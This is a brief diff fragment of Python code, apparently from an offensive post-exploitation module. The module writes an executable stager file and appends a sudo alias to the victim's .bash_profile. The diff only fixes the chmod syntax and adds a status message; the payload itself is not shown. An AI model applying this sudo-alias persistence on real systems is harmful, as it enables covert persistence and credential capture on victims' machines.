@@ -37,5 +37,6 @@ stager += launcher
 with open(bashlocation, 'w') as f:
     f.write(stager)
     f.close()
-os.chmod(bashlocation, 0755)
+os.chmod(bashlocation, 0o755)
+print("[+] sudo alias appended to " + home + "/.bash_profile; stager written to " + bashlocation)
 """
